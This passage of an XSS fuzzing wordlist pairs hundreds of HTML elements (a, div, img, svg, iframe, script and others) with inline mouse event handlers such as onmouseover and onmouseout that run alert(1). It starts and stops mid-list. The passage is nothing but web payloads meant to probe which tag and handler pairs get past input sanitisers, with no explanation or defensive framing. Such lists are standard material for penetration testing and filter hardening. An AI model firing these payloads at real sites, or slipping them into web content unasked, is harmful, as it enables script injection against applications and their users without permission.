<ul onmousedown="alert(1)">test</ul>
<var onmousedown="alert(1)">test</var>
<video onmousedown="alert(1)">test</video>
<wbr onmousedown="alert(1)">test</wbr>
<xmp onmousedown="alert(1)">test</xmp>
<a onmouseenter="alert(1)">test</a>
<abbr onmouseenter="alert(1)">test</abbr>
<acronym onmouseenter="alert(1)">test</acronym>
<address onmouseenter="alert(1)">test</address>
<applet onmouseenter="alert(1)">test</applet>
<area onmouseenter="alert(1)">test</area>
<article onmouseenter="alert(1)">test</article>
<aside onmouseenter="alert(1)">test</aside>
<audio onmouseenter="alert(1)">test</audio>
<b onmouseenter="alert(1)">test</b>
<base onmouseenter="alert(1)">test</base>
<basefont onmouseenter="alert(1)">test</basefont>
<bdi onmouseenter="alert(1)">test</bdi>
<bdo onmouseenter="alert(1)">test</bdo>
<bgsound onmouseenter="alert(1)">test</bgsound>
<big onmouseenter="alert(1)">test</big>
<blink onmouseenter="alert(1)">test</blink>
<blockquote onmouseenter="alert(1)">test</blockquote>
<body onmouseenter="alert(1)">test</body>
<br onmouseenter="alert(1)">test</br>
<button onmouseenter="alert(1)">test</button>
<canvas onmouseenter="alert(1)">test</canvas>
<caption onmouseenter="alert(1)">test</caption>
<center onmouseenter="alert(1)">test</center>
<cite onmouseenter="alert(1)">test</cite>
<code onmouseenter="alert(1)">test</code>
<col onmouseenter="alert(1)">test</col>
<colgroup onmouseenter="alert(1)">test</colgroup>
<command onmouseenter="alert(1)">test</command>
<content onmouseenter="alert(1)">test</content>
<data onmouseenter="alert(1)">test</data>
<datalist onmouseenter="alert(1)">test</datalist>
<dd onmouseenter="alert(1)">test</dd>
<del onmouseenter="alert(1)">test</del>
<details onmouseenter="alert(1)">test</details>
<dfn onmouseenter="alert(1)">test</dfn>
<dialog onmouseenter="alert(1)">test</dialog>
<dir onmouseenter="alert(1)">test</dir>
<div onmouseenter="alert(1)">test</div>
<dl onmouseenter="alert(1)">test</dl>
<dt onmouseenter="alert(1)">test</dt>
<element onmouseenter="alert(1)">test</element>
<em onmouseenter="alert(1)">test</em>
<embed onmouseenter="alert(1)">test</embed>
<fieldset onmouseenter="alert(1)">test</fieldset>
<figcaption onmouseenter="alert(1)">test</figcaption>
<figure onmouseenter="alert(1)">test</figure>
<font onmouseenter="alert(1)">test</font>
<footer onmouseenter="alert(1)">test</footer>
<form onmouseenter="alert(1)">test</form>
<frame onmouseenter="alert(1)">test</frame>
<frameset onmouseenter="alert(1)">test</frameset>
<h1 onmouseenter="alert(1)">test</h1>
<head onmouseenter="alert(1)">test</head>
<header onmouseenter="alert(1)">test</header>
<hgroup onmouseenter="alert(1)">test</hgroup>
<hr onmouseenter="alert(1)">test</hr>
<html onmouseenter="alert(1)">test</html>
<i onmouseenter="alert(1)">test</i>
<iframe onmouseenter="alert(1)">test</iframe>
<image onmouseenter="alert(1)">test</image>
<img onmouseenter="alert(1)">test</img>
<input onmouseenter="alert(1)">test</input>
<ins onmouseenter="alert(1)">test</ins>
<isindex onmouseenter="alert(1)">test</isindex>
<kbd onmouseenter="alert(1)">test</kbd>
<keygen onmouseenter="alert(1)">test</keygen>
<label onmouseenter="alert(1)">test</label>
<legend onmouseenter="alert(1)">test</legend>
<li onmouseenter="alert(1)">test</li>
<link onmouseenter="alert(1)">test</link>
<listing onmouseenter="alert(1)">test</listing>
<main onmouseenter="alert(1)">test</main>
<map onmouseenter="alert(1)">test</map>
<mark onmouseenter="alert(1)">test</mark>
<marquee onmouseenter="alert(1)">test</marquee>
<menu onmouseenter="alert(1)">test</menu>
<menuitem onmouseenter="alert(1)">test</menuitem>
<meta onmouseenter="alert(1)">test</meta>
<meter onmouseenter="alert(1)">test</meter>
<multicol onmouseenter="alert(1)">test</multicol>
<nav onmouseenter="alert(1)">test</nav>
<nextid onmouseenter="alert(1)">test</nextid>
<nobr onmouseenter="alert(1)">test</nobr>
<noembed onmouseenter="alert(1)">test</noembed>
<noframes onmouseenter="alert(1)">test</noframes>
<noscript onmouseenter="alert(1)">test</noscript>
<object onmouseenter="alert(1)">test</object>
<ol onmouseenter="alert(1)">test</ol>
<optgroup onmouseenter="alert(1)">test</optgroup>
<option onmouseenter="alert(1)">test</option>
<output onmouseenter="alert(1)">test</output>
<p onmouseenter="alert(1)">test</p>
<param onmouseenter="alert(1)">test</param>
<picture onmouseenter="alert(1)">test</picture>
<plaintext onmouseenter="alert(1)">test</plaintext>
<pre onmouseenter="alert(1)">test</pre>
<progress onmouseenter="alert(1)">test</progress>
<q onmouseenter="alert(1)">test</q>
<rb onmouseenter="alert(1)">test</rb>
<rp onmouseenter="alert(1)">test</rp>
<rt onmouseenter="alert(1)">test</rt>
<rtc onmouseenter="alert(1)">test</rtc>
<ruby onmouseenter="alert(1)">test</ruby>
<s onmouseenter="alert(1)">test</s>
<samp onmouseenter="alert(1)">test</samp>
<script onmouseenter="alert(1)">test</script>
<section onmouseenter="alert(1)">test</section>
<select onmouseenter="alert(1)">test</select>
<shadow onmouseenter="alert(1)">test</shadow>
<slot onmouseenter="alert(1)">test</slot>
<small onmouseenter="alert(1)">test</small>
<source onmouseenter="alert(1)">test</source>
<spacer onmouseenter="alert(1)">test</spacer>
<span onmouseenter="alert(1)">test</span>
<strike onmouseenter="alert(1)">test</strike>
<strong onmouseenter="alert(1)">test</strong>
<style onmouseenter="alert(1)">test</style>
<sub onmouseenter="alert(1)">test</sub>
<summary onmouseenter="alert(1)">test</summary>
<sup onmouseenter="alert(1)">test</sup>
<svg onmouseenter="alert(1)">test</svg>
<table onmouseenter="alert(1)">test</table>
<tbody onmouseenter="alert(1)">test</tbody>
<td onmouseenter="alert(1)">test</td>
<template onmouseenter="alert(1)">test</template>
<textarea onmouseenter="alert(1)">test</textarea>
<tfoot onmouseenter="alert(1)">test</tfoot>
<th onmouseenter="alert(1)">test</th>
<thead onmouseenter="alert(1)">test</thead>
<time onmouseenter="alert(1)">test</time>
<title onmouseenter="alert(1)">test</title>
<tr onmouseenter="alert(1)">test</tr>
<track onmouseenter="alert(1)">test</track>
<tt onmouseenter="alert(1)">test</tt>
<u onmouseenter="alert(1)">test</u>
<ul onmouseenter="alert(1)">test</ul>
<var onmouseenter="alert(1)">test</var>
<video onmouseenter="alert(1)">test</video>
<wbr onmouseenter="alert(1)">test</wbr>
<xmp onmouseenter="alert(1)">test</xmp>
<a onmouseleave="alert(1)">test</a>
<abbr onmouseleave="alert(1)">test</abbr>
<acronym onmouseleave="alert(1)">test</acronym>
<address onmouseleave="alert(1)">test</address>
<applet onmouseleave="alert(1)">test</applet>
<area onmouseleave="alert(1)">test</area>
<article onmouseleave="alert(1)">test</article>
<aside onmouseleave="alert(1)">test</aside>
<audio onmouseleave="alert(1)">test</audio>
<b onmouseleave="alert(1)">test</b>
<base onmouseleave="alert(1)">test</base>
<basefont onmouseleave="alert(1)">test</basefont>
<bdi onmouseleave="alert(1)">test</bdi>
<bdo onmouseleave="alert(1)">test</bdo>
<bgsound onmouseleave="alert(1)">test</bgsound>
<big onmouseleave="alert(1)">test</big>
<blink onmouseleave="alert(1)">test</blink>
<blockquote onmouseleave="alert(1)">test</blockquote>
<body onmouseleave="alert(1)">test</body>
<br onmouseleave="alert(1)">test</br>
<button onmouseleave="alert(1)">test</button>
<canvas onmouseleave="alert(1)">test</canvas>
<caption onmouseleave="alert(1)">test</caption>
<center onmouseleave="alert(1)">test</center>
<cite onmouseleave="alert(1)">test</cite>
<code onmouseleave="alert(1)">test</code>
<col onmouseleave="alert(1)">test</col>
<colgroup onmouseleave="alert(1)">test</colgroup>
<command onmouseleave="alert(1)">test</command>
<content onmouseleave="alert(1)">test</content>
<data onmouseleave="alert(1)">test</data>
<datalist onmouseleave="alert(1)">test</datalist>
<dd onmouseleave="alert(1)">test</dd>
<del onmouseleave="alert(1)">test</del>
<details onmouseleave="alert(1)">test</details>
<dfn onmouseleave="alert(1)">test</dfn>
<dialog onmouseleave="alert(1)">test</dialog>
<dir onmouseleave="alert(1)">test</dir>
<div onmouseleave="alert(1)">test</div>
<dl onmouseleave="alert(1)">test</dl>
<dt onmouseleave="alert(1)">test</dt>
<element onmouseleave="alert(1)">test</element>
<em onmouseleave="alert(1)">test</em>
<embed onmouseleave="alert(1)">test</embed>
<fieldset onmouseleave="alert(1)">test</fieldset>
<figcaption onmouseleave="alert(1)">test</figcaption>
<figure onmouseleave="alert(1)">test</figure>
<font onmouseleave="alert(1)">test</font>
<footer onmouseleave="alert(1)">test</footer>
<form onmouseleave="alert(1)">test</form>
<frame onmouseleave="alert(1)">test</frame>
<frameset onmouseleave="alert(1)">test</frameset>
<h1 onmouseleave="alert(1)">test</h1>
<head onmouseleave="alert(1)">test</head>
<header onmouseleave="alert(1)">test</header>
<hgroup onmouseleave="alert(1)">test</hgroup>
<hr onmouseleave="alert(1)">test</hr>
<html onmouseleave="alert(1)">test</html>
<i onmouseleave="alert(1)">test</i>
<iframe onmouseleave="alert(1)">test</iframe>
<image onmouseleave="alert(1)">test</image>
<img onmouseleave="alert(1)">test</img>
<input onmouseleave="alert(1)">test</input>
<ins onmouseleave="alert(1)">test</ins>
<isindex onmouseleave="alert(1)">test</isindex>
<kbd onmouseleave="alert(1)">test</kbd>
<keygen onmouseleave="alert(1)">test</keygen>
<label onmouseleave="alert(1)">test</label>
<legend onmouseleave="alert(1)">test</legend>
<li onmouseleave="alert(1)">test</li>
<link onmouseleave="alert(1)">test</link>
<listing onmouseleave="alert(1)">test</listing>
<main onmouseleave="alert(1)">test</main>
<map onmouseleave="alert(1)">test</map>
<mark onmouseleave="alert(1)">test</mark>
<marquee onmouseleave="alert(1)">test</marquee>
<menu onmouseleave="alert(1)">test</menu>
<menuitem onmouseleave="alert(1)">test</menuitem>
<meta onmouseleave="alert(1)">test</meta>
<meter onmouseleave="alert(1)">test</meter>
<multicol onmouseleave="alert(1)">test</multicol>
<nav onmouseleave="alert(1)">test</nav>
<nextid onmouseleave="alert(1)">test</nextid>
<nobr onmouseleave="alert(1)">test</nobr>
<noembed onmouseleave="alert(1)">test</noembed>
<noframes onmouseleave="alert(1)">test</noframes>
<noscript onmouseleave="alert(1)">test</noscript>
<object onmouseleave="alert(1)">test</object>
<ol onmouseleave="alert(1)">test</ol>
<optgroup onmouseleave="alert(1)">test</optgroup>
<option onmouseleave="alert(1)">test</option>
<output onmouseleave="alert(1)">test</output>
<p onmouseleave="alert(1)">test</p>
<param onmouseleave="alert(1)">test</param>
<picture onmouseleave="alert(1)">test</picture>
<plaintext onmouseleave="alert(1)">test</plaintext>
<pre onmouseleave="alert(1)">test</pre>
<progress onmouseleave="alert(1)">test</progress>
<q onmouseleave="alert(1)">test</q>
<rb onmouseleave="alert(1)">test</rb>
<rp onmouseleave="alert(1)">test</rp>
<rt onmouseleave="alert(1)">test</rt>
<rtc onmouseleave="alert(1)">test</rtc>
<ruby onmouseleave="alert(1)">test</ruby>
<s onmouseleave="alert(1)">test</s>
<samp onmouseleave="alert(1)">test</samp>
<script onmouseleave="alert(1)">test</script>
<section onmouseleave="alert(1)">test</section>
<select onmouseleave="alert(1)">test</select>
<shadow onmouseleave="alert(1)">test</shadow>
<slot onmouseleave="alert(1)">test</slot>
<small onmouseleave="alert(1)">test</small>
<source onmouseleave="alert(1)">test</source>
<spacer onmouseleave="alert(1)">test</spacer>
<span onmouseleave="alert(1)">test</span>
<strike onmouseleave="alert(1)">test</strike>
<strong onmouseleave="alert(1)">test</strong>
<style onmouseleave="alert(1)">test</style>
<sub onmouseleave="alert(1)">test</sub>
<summary onmouseleave="alert(1)">test</summary>
<sup onmouseleave="alert(1)">test</sup>
<svg onmouseleave="alert(1)">test</svg>
<table onmouseleave="alert(1)">test</table>
<tbody onmouseleave="alert(1)">test</tbody>
<td onmouseleave="alert(1)">test</td>
<template onmouseleave="alert(1)">test</template>
<textarea onmouseleave="alert(1)">test</textarea>
<tfoot onmouseleave="alert(1)">test</tfoot>
<th onmouseleave="alert(1)">test</th>
<thead onmouseleave="alert(1)">test</thead>
<time onmouseleave="alert(1)">test</time>
<title onmouseleave="alert(1)">test</title>
<tr onmouseleave="alert(1)">test</tr>
<track onmouseleave="alert(1)">test</track>
<tt onmouseleave="alert(1)">test</tt>
<u onmouseleave="alert(1)">test</u>
<ul onmouseleave="alert(1)">test</ul>
<var onmouseleave="alert(1)">test</var>
<video onmouseleave="alert(1)">test</video>
<wbr onmouseleave="alert(1)">test</wbr>
<xmp onmouseleave="alert(1)">test</xmp>
<a onmousemove="alert(1)">test</a>
<abbr onmousemove="alert(1)">test</abbr>
<acronym onmousemove="alert(1)">test</acronym>
<address onmousemove="alert(1)">test</address>
<applet onmousemove="alert(1)">test</applet>
<area onmousemove="alert(1)">test</area>
<article onmousemove="alert(1)">test</article>
<aside onmousemove="alert(1)">test</aside>
<audio onmousemove="alert(1)">test</audio>
<b onmousemove="alert(1)">test</b>
<base onmousemove="alert(1)">test</base>
<basefont onmousemove="alert(1)">test</basefont>
<bdi onmousemove="alert(1)">test</bdi>
<bdo onmousemove="alert(1)">test</bdo>
<bgsound onmousemove="alert(1)">test</bgsound>
<big onmousemove="alert(1)">test</big>
<blink onmousemove="alert(1)">test</blink>
<blockquote onmousemove="alert(1)">test</blockquote>
<body onmousemove="alert(1)">test</body>
<br onmousemove="alert(1)">test</br>
<button onmousemove="alert(1)">test</button>
<canvas onmousemove="alert(1)">test</canvas>
<caption onmousemove="alert(1)">test</caption>
<center onmousemove="alert(1)">test</center>
<cite onmousemove="alert(1)">test</cite>
<code onmousemove="alert(1)">test</code>
<col onmousemove="alert(1)">test</col>
<colgroup onmousemove="alert(1)">test</colgroup>
<command onmousemove="alert(1)">test</command>
<content onmousemove="alert(1)">test</content>
<data onmousemove="alert(1)">test</data>
<datalist onmousemove="alert(1)">test</datalist>
<dd onmousemove="alert(1)">test</dd>
<del onmousemove="alert(1)">test</del>
<details onmousemove="alert(1)">test</details>
<dfn onmousemove="alert(1)">test</dfn>
<dialog onmousemove="alert(1)">test</dialog>
<dir onmousemove="alert(1)">test</dir>
<div onmousemove="alert(1)">test</div>
<dl onmousemove="alert(1)">test</dl>
<dt onmousemove="alert(1)">test</dt>
<element onmousemove="alert(1)">test</element>
<em onmousemove="alert(1)">test</em>
<embed onmousemove="alert(1)">test</embed>
<fieldset onmousemove="alert(1)">test</fieldset>
<figcaption onmousemove="alert(1)">test</figcaption>
<figure onmousemove="alert(1)">test</figure>
<font onmousemove="alert(1)">test</font>
<footer onmousemove="alert(1)">test</footer>
<form onmousemove="alert(1)">test</form>
<frame onmousemove="alert(1)">test</frame>
<frameset onmousemove="alert(1)">test</frameset>
<h1 onmousemove="alert(1)">test</h1>
<head onmousemove="alert(1)">test</head>
<header onmousemove="alert(1)">test</header>
<hgroup onmousemove="alert(1)">test</hgroup>
<hr onmousemove="alert(1)">test</hr>
<html onmousemove="alert(1)">test</html>
<i onmousemove="alert(1)">test</i>
<iframe onmousemove="alert(1)">test</iframe>
<image onmousemove="alert(1)">test</image>
<img onmousemove="alert(1)">test</img>
<input onmousemove="alert(1)">test</input>
<ins onmousemove="alert(1)">test</ins>
<isindex onmousemove="alert(1)">test</isindex>
<kbd onmousemove="alert(1)">test</kbd>
<keygen onmousemove="alert(1)">test</keygen>
<label onmousemove="alert(1)">test</label>
<legend onmousemove="alert(1)">test</legend>
<li onmousemove="alert(1)">test</li>
<link onmousemove="alert(1)">test</link>
<listing onmousemove="alert(1)">test</listing>
<main onmousemove="alert(1)">test</main>
<map onmousemove="alert(1)">test</map>
<mark onmousemove="alert(1)">test</mark>
<marquee onmousemove="alert(1)">test</marquee>
<menu onmousemove="alert(1)">test</menu>
<menuitem onmousemove="alert(1)">test</menuitem>
<meta onmousemove="alert(1)">test</meta>
<meter onmousemove="alert(1)">test</meter>
<multicol onmousemove="alert(1)">test</multicol>
<nav onmousemove="alert(1)">test</nav>
<nextid onmousemove="alert(1)">test</nextid>
<nobr onmousemove="alert(1)">test</nobr>
<noembed onmousemove="alert(1)">test</noembed>
<noframes onmousemove="alert(1)">test</noframes>
<noscript onmousemove="alert(1)">test</noscript>
<object onmousemove="alert(1)">test</object>
<ol onmousemove="alert(1)">test</ol>
<optgroup onmousemove="alert(1)">test</optgroup>
<option onmousemove="alert(1)">test</option>
<output onmousemove="alert(1)">test</output>
<p onmousemove="alert(1)">test</p>
<param onmousemove="alert(1)">test</param>
<picture onmousemove="alert(1)">test</picture>
<plaintext onmousemove="alert(1)">test</plaintext>
<pre onmousemove="alert(1)">test</pre>
<progress onmousemove="alert(1)">test</progress>
<q onmousemove="alert(1)">test</q>
<rb onmousemove="alert(1)">test</rb>
<rp onmousemove="alert(1)">test</rp>
<rt onmousemove="alert(1)">test</rt>
<rtc onmousemove="alert(1)">test</rtc>
<ruby onmousemove="alert(1)">test</ruby>
<s onmousemove="alert(1)">test</s>
<samp onmousemove="alert(1)">test</samp>
<script onmousemove="alert(1)">test</script>
<section onmousemove="alert(1)">test</section>
<select onmousemove="alert(1)">test</select>
<shadow onmousemove="alert(1)">test</shadow>
<slot onmousemove="alert(1)">test</slot>
<small onmousemove="alert(1)">test</small>
<source onmousemove="alert(1)">test</source>
<spacer onmousemove="alert(1)">test</spacer>
<span onmousemove="alert(1)">test</span>
<strike onmousemove="alert(1)">test</strike>
<strong onmousemove="alert(1)">test</strong>
<style onmousemove="alert(1)">test</style>
<sub onmousemove="alert(1)">test</sub>
<summary onmousemove="alert(1)">test</summary>
<sup onmousemove="alert(1)">test</sup>
<svg onmousemove="alert(1)">test</svg>
<table onmousemove="alert(1)">test</table>
<tbody onmousemove="alert(1)">test</tbody>
<td onmousemove="alert(1)">test</td>
<template onmousemove="alert(1)">test</template>
<textarea onmousemove="alert(1)">test</textarea>
<tfoot onmousemove="alert(1)">test</tfoot>
<th onmousemove="alert(1)">test</th>
<thead onmousemove="alert(1)">test</thead>
<time onmousemove="alert(1)">test</time>
<title onmousemove="alert(1)">test</title>
<tr onmousemove="alert(1)">test</tr>
<track onmousemove="alert(1)">test</track>
<tt onmousemove="alert(1)">test</tt>
<u onmousemove="alert(1)">test</u>
<ul onmousemove="alert(1)">test</ul>
<var onmousemove="alert(1)">test</var>
<video onmousemove="alert(1)">test</video>
<wbr onmousemove="alert(1)">test</wbr>
<xmp onmousemove="alert(1)">test</xmp>
<a onmouseout="alert(1)">test</a>
<abbr onmouseout="alert(1)">test</abbr>
<acronym onmouseout="alert(1)">test</acronym>
<address onmouseout="alert(1)">test</address>
<applet onmouseout="alert(1)">test</applet>
<area onmouseout="alert(1)">test</area>
<article onmouseout="alert(1)">test</article>
<aside onmouseout="alert(1)">test</aside>
<audio onmouseout="alert(1)">test</audio>
<b onmouseout="alert(1)">test</b>
<base onmouseout="alert(1)">test</base>
<basefont onmouseout="alert(1)">test</basefont>
<bdi onmouseout="alert(1)">test</bdi>
<bdo onmouseout="alert(1)">test</bdo>
<bgsound onmouseout="alert(1)">test</bgsound>
<big onmouseout="alert(1)">test</big>
<blink onmouseout="alert(1)">test</blink>
<blockquote onmouseout="alert(1)">test</blockquote>
<body onmouseout="alert(1)">test</body>
<br onmouseout="alert(1)">test</br>
<button onmouseout="alert(1)">test</button>
<canvas onmouseout="alert(1)">test</canvas>
<caption onmouseout="alert(1)">test</caption>
<center onmouseout="alert(1)">test</center>
<cite onmouseout="alert(1)">test</cite>
<code onmouseout="alert(1)">test</code>
<col onmouseout="alert(1)">test</col>
<colgroup onmouseout="alert(1)">test</colgroup>
<command onmouseout="alert(1)">test</command>
<content onmouseout="alert(1)">test</content>
<data onmouseout="alert(1)">test</data>
<datalist onmouseout="alert(1)">test</datalist>
<dd onmouseout="alert(1)">test</dd>
<del onmouseout="alert(1)">test</del>
<details onmouseout="alert(1)">test</details>
<dfn onmouseout="alert(1)">test</dfn>
<dialog onmouseout="alert(1)">test</dialog>
<dir onmouseout="alert(1)">test</dir>
<div onmouseout="alert(1)">test</div>
<dl onmouseout="alert(1)">test</dl>
<dt onmouseout="alert(1)">test</dt>
<element onmouseout="alert(1)">test</element>
<em onmouseout="alert(1)">test</em>
<embed onmouseout="alert(1)">test</embed>
<fieldset onmouseout="alert(1)">test</fieldset>
<figcaption onmouseout="alert(1)">test</figcaption>
<figure onmouseout="alert(1)">test</figure>
<font onmouseout="alert(1)">test</font>
<footer onmouseout="alert(1)">test</footer>
<form onmouseout="alert(1)">test</form>
<frame onmouseout="alert(1)">test</frame>
<frameset onmouseout="alert(1)">test</frameset>
<h1 onmouseout="alert(1)">test</h1>
<head onmouseout="alert(1)">test</head>
<header onmouseout="alert(1)">test</header>
<hgroup onmouseout="alert(1)">test</hgroup>
<hr onmouseout="alert(1)">test</hr>
<html onmouseout="alert(1)">test</html>
<i onmouseout="alert(1)">test</i>
<iframe onmouseout="alert(1)">test</iframe>
<image onmouseout="alert(1)">test</image>
<img onmouseout="alert(1)">test</img>
<input onmouseout="alert(1)">test</input>
<ins onmouseout="alert(1)">test</ins>
<isindex onmouseout="alert(1)">test</isindex>
<kbd onmouseout="alert(1)">test</kbd>
<keygen onmouseout="alert(1)">test</keygen>
<label onmouseout="alert(1)">test</label>
<legend onmouseout="alert(1)">test</legend>
<li onmouseout="alert(1)">test</li>
<link onmouseout="alert(1)">test</link>
<listing onmouseout="alert(1)">test</listing>
<main onmouseout="alert(1)">test</main>
<map onmouseout="alert(1)">test</map>
<mark onmouseout="alert(1)">test</mark>
<marquee onmouseout="alert(1)">test</marquee>
<menu onmouseout="alert(1)">test</menu>
<menuitem onmouseout="alert(1)">test</menuitem>
<meta onmouseout="alert(1)">test</meta>
<meter onmouseout="alert(1)">test</meter>
<multicol onmouseout="alert(1)">test</multicol>
<nav onmouseout="alert(1)">test</nav>
<nextid onmouseout="alert(1)">test</nextid>
<nobr onmouseout="alert(1)">test</nobr>
<noembed onmouseout="alert(1)">test</noembed>
<noframes onmouseout="alert(1)">test</noframes>
<noscript onmouseout="alert(1)">test</noscript>
<object onmouseout="alert(1)">test</object>
<ol onmouseout="alert(1)">test</ol>
<optgroup onmouseout="alert(1)">test</optgroup>
<option onmouseout="alert(1)">test</option>
<output onmouseout="alert(1)">test</output>
<p onmouseout="alert(1)">test</p>
<param onmouseout="alert(1)">test</param>
<picture onmouseout="alert(1)">test</picture>
<plaintext onmouseout="alert(1)">test</plaintext>
<pre onmouseout="alert(1)">test</pre>
<progress onmouseout="alert(1)">test</progress>
<q onmouseout="alert(1)">test</q>
<rb onmouseout="alert(1)">test</rb>
<rp onmouseout="alert(1)">test</rp>
<rt onmouseout="alert(1)">test</rt>
<rtc onmouseout="alert(1)">test</rtc>
<ruby onmouseout="alert(1)">test</ruby>
<s onmouseout="alert(1)">test</s>
<samp onmouseout="alert(1)">test</samp>
<script onmouseout="alert(1)">test</script>
<section onmouseout="alert(1)">test</section>
<select onmouseout="alert(1)">test</select>
<shadow onmouseout="alert(1)">test</shadow>
<slot onmouseout="alert(1)">test</slot>
<small onmouseout="alert(1)">test</small>
<source onmouseout="alert(1)">test</source>
<spacer onmouseout="alert(1)">test</spacer>
<span onmouseout="alert(1)">test</span>
<strike onmouseout="alert(1)">test</strike>
<strong onmouseout="alert(1)">test</strong>
<style onmouseout="alert(1)">test</style>
<sub onmouseout="alert(1)">test</sub>
<summary onmouseout="alert(1)">test</summary>
<sup onmouseout="alert(1)">test</sup>
<svg onmouseout="alert(1)">test</svg>
<table onmouseout="alert(1)">test</table>
<tbody onmouseout="alert(1)">test</tbody>
<td onmouseout="alert(1)">test</td>
<template onmouseout="alert(1)">test</template>
<textarea onmouseout="alert(1)">test</textarea>
<tfoot onmouseout="alert(1)">test</tfoot>
<th onmouseout="alert(1)">test</th>
<thead onmouseout="alert(1)">test</thead>
<time onmouseout="alert(1)">test</time>
<title onmouseout="alert(1)">test</title>
<tr onmouseout="alert(1)">test</tr>
<track onmouseout="alert(1)">test</track>
<tt onmouseout="alert(1)">test</tt>
<u onmouseout="alert(1)">test</u>
<ul onmouseout="alert(1)">test</ul>
<var onmouseout="alert(1)">test</var>
<video onmouseout="alert(1)">test</video>
<wbr onmouseout="alert(1)">test</wbr>
<xmp onmouseout="alert(1)">test</xmp>
<a onmouseover="alert(1)">test</a>
<abbr onmouseover="alert(1)">test</abbr>
<acronym onmouseover="alert(1)">test</acronym>
<address onmouseover="alert(1)">test</address>
<applet onmouseover="alert(1)">test</applet>
<area onmouseover="alert(1)">test</area>
<article onmouseover="alert(1)">test</article>
<aside onmouseover="alert(1)">test</aside>
<audio onmouseover="alert(1)">test</audio>
<b onmouseover="alert(1)">test</b>
<base onmouseover="alert(1)">test</base>
<basefont onmouseover="alert(1)">test</basefont>
<bdi onmouseover="alert(1)">test</bdi>
<bdo onmouseover="alert(1)">test</bdo>
<bgsound onmouseover="alert(1)">test</bgsound>
<big onmouseover="alert(1)">test</big>
<blink onmouseover="alert(1)">test</blink>
<blockquote onmouseover="alert(1)">test</blockquote>
<body onmouseover="alert(1)">test</body>
<br onmouseover="alert(1)">test</br>
<button onmouseover="alert(1)">test</button>
<canvas onmouseover="alert(1)">test</canvas>
<caption onmouseover="alert(1)">test</caption>
<center onmouseover="alert(1)">test</center>
<cite onmouseover="alert(1)">test</cite>
<code onmouseover="alert(1)">test</code>
<col onmouseover="alert(1)">test</col>
<colgroup onmouseover="alert(1)">test</colgroup>
<command onmouseover="alert(1)">test</command>
<content onmouseover="alert(1)">test</content>
<data onmouseover="alert(1)">test</data>
<datalist onmouseover="alert(1)">test</datalist>
<dd onmouseover="alert(1)">test</dd>
<del onmouseover="alert(1)">test</del>
<details onmouseover="alert(1)">test</details>
<dfn onmouseover="alert(1)">test</dfn>
<dialog onmouseover="alert(1)">test</dialog>
<dir onmouseover="alert(1)">test</dir>
<div onmouseover="alert(1)">test</div>
<dl onmouseover="alert(1)">test</dl>
<dt onmouseover="alert(1)">test</dt>
<element onmouseover="alert(1)">test</element>
<em onmouseover="alert(1)">test</em>
<embed onmouseover="alert(1)">test</embed>
<fieldset onmouseover="alert(1)">test</fieldset>
<figcaption onmouseover="alert(1)">test</figcaption>
<figure onmouseover="alert(1)">test</figure>
<font onmouseover="alert(1)">test</font>
<footer onmouseover="alert(1)">test</footer>
<form onmouseover="alert(1)">test</form>
<frame onmouseover="alert(1)">test</frame>
<frameset onmouseover="alert(1)">test</frameset>
<h1 onmouseover="alert(1)">test</h1>
<head onmouseover="alert(1)">test</head>
<header onmouseover="alert(1)">test</header>
<hgroup onmouseover="alert(1)">test</hgroup>
<hr onmouseover="alert(1)">test</hr>
<html onmouseover="alert(1)">test</html>
<i onmouseover="alert(1)">test</i>
<iframe onmouseover="alert(1)">test</iframe>
<image onmouseover="alert(1)">test</image>
<img onmouseover="alert(1)">test</img>
<input onmouseover="alert(1)">test</input>
<ins onmouseover="alert(1)">test</ins>
<isindex onmouseover="alert(1)">test</isindex>
<kbd onmouseover="alert(1)">test</kbd>
<keygen onmouseover="alert(1)">test</keygen>
<label onmouseover="alert(1)">test</label>
<legend onmouseover="alert(1)">test</legend>
<li onmouseover="alert(1)">test</li>
<link onmouseover="alert(1)">test</link>
<listing onmouseover="alert(1)">test</listing>
<main onmouseover="alert(1)">test</main>
<map onmouseover="alert(1)">test</map>
<mark onmouseover="alert(1)">test</mark>
<marquee onmouseover="alert(1)">test</marquee>
<menu onmouseover="alert(1)">test</menu>
<menuitem onmouseover="alert(1)">test</menuitem>
<meta onmouseover="alert(1)">test</meta>
<meter onmouseover="alert(1)">test</meter>
<multicol onmouseover="alert(1)">test</multicol>
<nav onmouseover="alert(1)">test</nav>
<nextid onmouseover="alert(1)">test</nextid>
<nobr onmouseover="alert(1)">test</nobr>
<noembed onmouseover="alert(1)">test</noembed>
<noframes onmouseover="alert(1)">test</noframes>
<noscript onmouseover="alert(1)">test</noscript>
<object onmouseover="alert(1)">test</object>
<ol onmouseover="alert(1)">test</ol>
<optgroup onmouseover="alert(1)">test</optgroup>
<option onmouseover="alert(1)">test</option>
<output onmouseover="alert(1)">test</output>
<p onmouseover="alert(1)">test</p>
<param onmouseover="alert(1)">test</param>
<picture onmouseover="alert(1)">test</picture>
<plaintext onmouseover="alert(1)">test</plaintext>
<pre onmouseover="alert(1)">test</pre>
<progress onmouseover="alert(1)">test</progress>
<q onmouseover="alert(1)">test</q>
<rb onmouseover="alert(1)">test</rb>
<rp onmouseover="alert(1)">test</rp>
<rt onmouseover="alert(1)">test</rt>
<rtc onmouseover="alert(1)">test</rtc>
<ruby onmouseover="alert(1)">test</ruby>
<s onmouseover="alert(1)">test</s>
<samp onmouseover="alert(1)">test</samp>
<script onmouseover="alert(1)">test</script>
<section onmouseover="alert(1)">test</section>
<select onmouseover="alert(1)">test</select>
<shadow onmouseover="alert(1)">test</shadow>
<slot onmouseover="alert(1)">test</slot>
<small onmouseover="alert(1)">test</small>
<source onmouseover="alert(1)">test</source>
<spacer onmouseover="alert(1)">test</spacer>
<span onmouseover="alert(1)">test</span>
<strike onmouseover="alert(1)">test</strike>
<strong onmouseover="alert(1)">test</strong>
<style onmouseover="alert(1)">test</style>
<sub onmouseover="alert(1)">test</sub>
<summary onmouseover="alert(1)">test</summary>
<sup onmouseover="alert(1)">test</sup>
<svg onmouseover="alert(1)">test</svg>
<table onmouseover="alert(1)">test</table>
<tbody onmouseover="alert(1)">test</tbody>
<td onmouseover="alert(1)">test</td>
<template onmouseover="alert(1)">test</template>
<textarea onmouseover="alert(1)">test</textarea>
<tfoot onmouseover="alert(1)">test</tfoot>
<th onmouseover="alert(1)">test</th>
<thead onmouseover="alert(1)">test</thead>
<time onmouseover="alert(1)">test</time>
<title onmouseover="alert(1)">test</title>
<tr onmouseover="alert(1)">test</tr>
<track onmouseover="alert(1)">test</track>
<tt onmouseover="alert(1)">test</tt>
<u onmouseover="alert(1)">test</u>
